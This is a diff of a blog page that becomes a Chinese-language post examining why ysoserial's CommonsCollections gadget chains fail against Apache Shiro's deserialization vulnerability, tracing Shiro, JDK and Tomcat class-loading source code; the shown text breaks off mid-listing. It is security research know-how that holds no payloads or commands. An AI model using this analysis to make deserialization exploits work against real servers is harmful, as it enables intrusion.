@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Halfblue</title>
+  <title>shiro反序列化漏洞与tomcat类加载机制 | Halfblue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Halfblue">
-<meta property="og:url" content="http://yoursite.com/page/4/index.html">
+  <meta name="description" content="shiro反序列化漏洞中有个经典的现象，就是不能用ysoserial自带的链去打commons-collections3的依赖。有很多文章分析过，但总觉得没完全看懂，差了点什么。那么调试源码详细分析下这个问题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro反序列化漏洞与tomcat类加载机制">
+<meta property="og:url" content="http://yoursite.com/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/index.html">
 <meta property="og:site_name" content="Halfblue">
+<meta property="og:description" content="shiro反序列化漏洞中有个经典的现象，就是不能用ysoserial自带的链去打commons-collections3的依赖。有很多文章分析过，但总觉得没完全看懂，差了点什么。那么调试源码详细分析下这个问题。">
 <meta property="og:locale">
+<meta property="article:published_time" content="2021-11-30T15:29:14.000Z">
+<meta property="article:modified_time" content="2021-12-08T12:12:05.936Z">
 <meta property="article:author" content="halfblue">
 <meta name="twitter:card" content="summary">
   
@@ -144,32 +148,55 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-线性回归练习-李宏毅机器学习hw1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-shiro反序列化漏洞与tomcat类加载机制" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/26/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E7%BB%83%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0hw1/">线性回归练习--李宏毅机器学习hw1</a>
+    <h1 class="article-title" itemprop="name">
+      shiro反序列化漏洞与tomcat类加载机制
     </h1>
   
 
         
-        <a href="/2019/02/26/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E7%BB%83%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0hw1/" class="archive-article-date">
-  	<time datetime="2019-02-26T14:55:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+        <a href="/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" class="archive-article-date">
+  	<time datetime="2021-11-30T15:29:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-30</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>以前总说安全是不产生价值的岗位，结果现在又往一样不产生价值的数据分析里跳，谁让这玩意火呢。最近看机器学习，看的也不快，做个题熟悉一下，还是有不了解的东西，虽然只是个最简单的线性回归。
-        
-          <a class="article-more-a" href="/2019/02/26/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E7%BB%83%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0hw1/#more">more >></a>
-        
+        <p>shiro反序列化漏洞中有个经典的现象，就是不能用ysoserial自带的链去打commons-collections3的依赖。有很多文章分析过，但总觉得没完全看懂，差了点什么。那么调试源码详细分析下这个问题。<span id="more"></span><br>添加commonscollections3.2.1依赖后，尝试反序列化打cc6链失败，是因为反序列化输入流ClassResolvingObjectInputStream重写了resolveClass方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对比下正常反序列化流程的ObjectInputStream#resolveClass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看上去大差不差，只是将原生的Class.forName改成了ClassUtils.forName</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn +</span><br><span class="line">                    <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        String msg = <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> +</span><br><span class="line">                <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnknownClassException(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到实际上ClassUtils.forName并没有调用原生的Class.forName，而是改成调用了几个CL_ACCESSOR的loadClass。这个accessor是ClassUtils的内部类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClassLoaderAccessor</span> </span>&#123;</span><br><span class="line">    <span class="function">Class <span class="title">loadClass</span><span class="params">(String fqcn)</span></span>;</span><br><span class="line">    <span class="function">InputStream <span class="title">getResourceStream</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionIgnoringAccessor</span> <span class="keyword">implements</span> <span class="title">ClassLoaderAccessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String fqcn)</span> </span>&#123;</span><br><span class="line">        Class clazz = <span class="keyword">null</span>;</span><br><span class="line">        ClassLoader cl = getClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = cl.loadClass(fqcn);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                    log.trace(<span class="string">&quot;Unable to load clazz named [&quot;</span> + fqcn + <span class="string">&quot;] from class loader [&quot;</span> + cl + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getResourceStream</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        InputStream is = <span class="keyword">null</span>;</span><br><span class="line">        ClassLoader cl = getClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            is = cl.getResourceAsStream(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> is;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ClassLoader <span class="title">getClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> doGetClassLoader();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Unable to acquire ClassLoader.&quot;</span>, t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> ClassLoader <span class="title">doGetClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试时发现反序列化时前两个if都是调用tomcat的ParallelWebAppClassLoader的loadClass进行加载，第三处是调用tomcat的AppClassLoader的loadClass加载。<br>这里有些文章就会分析说是因为ClassLoader#loadClass不能加载数组类，而Class#forName可以加载数组类，所以导致利用失败。<br>这个现象确实是存在的，比如这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;[Ljava.lang.String;&quot;</span>);<span class="comment">//成功</span></span><br><span class="line">ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;[Ljava.lang.String;&quot;</span>);<span class="comment">//失败</span></span><br></pre></td></tr></table></figure>
+<p>但也没必要当作一个固定的结论，可以分析下原因。<br>实际上Class#forName最后调用了一个native方法forName0对全类名进行了加载，而ClassLoader#loadClass并不能对应一个native方法，而是基于实现类的loadClass/findClass方法有不同实现的。我完全可以定义一个能加载数组类的ClassLoader</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">null</span>;</span><br><span class="line">        clazz = Class.forName(name);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么实际的类加载中loadClass是怎么实现的呢？先看看ClassLoader#loadClass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这相当于loadClass的原型，是实现了双亲委派模型的。一般来说ClassLoader的具体实现类都不会修改这个loadClass，而是改findClass方法，改写具体的搜索类的逻辑。比如最常用的URLClassLoader类，也就是ExtClassLoader和AppClassLoader的父类，就没有重写loadClass，而是重写了findClass：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedExceptionAction&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    String path = name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    Resource res = ucp.getResource(path, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现在这里将全类名转成了/a/b/c.class形式，然后调用defineClass去加载类文件。那么这里实际也解释了为什么常用的ClassLoader.getSystemClassLoader().loadClass无法加载数组，因为数组类的Class名称又带括号又带分号的，肯定对应不上文件。<br>但是这只能证明URLClassLoader不能加载数组类，tomcat中一般负责加载用户代码的类是ParallelWebappClassLoader，继承自WebappClassLoaderBase，实际上调用的也是WebappClassLoaderBase#loadClass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">            log.debug(<span class="string">&quot;loadClass(&quot;</span> + name + <span class="string">&quot;, &quot;</span> + resolve + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Log access to stopped class loader</span></span><br><span class="line">        checkStateForClassLoading(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (0) Check our previously loaded local class cache</span></span><br><span class="line">        clazz = findLoadedClass0(name);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                log.debug(<span class="string">&quot;  Returning class from cache&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (resolve)</span><br><span class="line">                resolveClass(clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (0.1) Check our previously loaded class cache</span></span><br><span class="line">        clazz = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">                log.debug(<span class="string">&quot;  Returning class from cache&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (resolve)</span><br><span class="line">                resolveClass(clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// (0.2) Try loading the class with the system class loader, to prevent</span></span><br><span class="line">        <span class="comment">//       the webapp from overriding Java SE classes. This implements</span></span><br><span class="line">        <span class="comment">//       SRV.10.7.2</span></span><br><span class="line">        String resourceName = binaryNameToPath(name, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        ClassLoader javaseLoader = getJavaseClassLoader();</span><br><span class="line">        <span class="keyword">boolean</span> tryLoadingFromJavaseLoader;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Use getResource as it won&#x27;t trigger an expensive</span></span><br><span class="line">            <span class="comment">// ClassNotFoundException if the resource is not available from</span></span><br><span class="line">            <span class="comment">// the Java SE class loader. However (see</span></span><br><span class="line">            <span class="comment">// https://bz.apache.org/bugzilla/show_bug.cgi?id=58125 for</span></span><br><span class="line">            <span class="comment">// details) when running under a security manager in rare cases</span></span><br><span class="line">            <span class="comment">// this call may trigger a ClassCircularityError.</span></span><br><span class="line">            <span class="comment">// See https://bz.apache.org/bugzilla/show_bug.cgi?id=61424 for</span></span><br><span class="line">            <span class="comment">// details of how this may trigger a StackOverflowError</span></span><br><span class="line">            <span class="comment">// Given these reported errors, catch Throwable to ensure any</span></span><br><span class="line">            <span class="comment">// other edge cases are also caught</span></span><br><span class="line">            URL url;</span><br><span class="line">            <span class="keyword">if</span> (securityManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">                PrivilegedAction&lt;URL&gt; dp = <span class="keyword">new</span> PrivilegedJavaseGetResource(resourceName);</span><br><span class="line">                url = AccessController.doPrivileged(dp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                url = javaseLoader.getResource(resourceName);</span><br><span class="line">            &#125;</span><br><span class="line">            tryLoadingFromJavaseLoader = (url != <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) 